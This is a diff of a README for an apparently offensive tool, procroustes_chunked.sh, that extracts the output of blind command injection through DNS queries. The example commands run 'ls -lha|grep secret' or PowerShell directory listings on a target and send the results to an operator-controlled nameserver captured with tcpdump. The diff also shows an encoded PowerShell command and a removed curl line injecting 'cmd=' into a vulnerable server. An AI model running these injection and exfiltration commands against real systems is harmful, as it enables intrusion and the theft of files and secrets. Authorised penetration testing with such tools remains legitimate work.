@@ -37,24 +37,15 @@ powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsA
 ./procroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
-Contents of local_bash.sh:
-> $@
-
 2. Local testing for powershell with WSL2:
 ```bash
 stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
 ```
 
-Contents of local_powershell_wsl2.sh:
-> /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe ${@:1}
-
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./procroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+./procroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x dispatcher_examples/curl_waf.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
-
-Contents of dispatcher.sh
-> curl https://vulnerable_server --data-urlencode "cmd=${1}"
 
 4. More information on the options
 ```bash
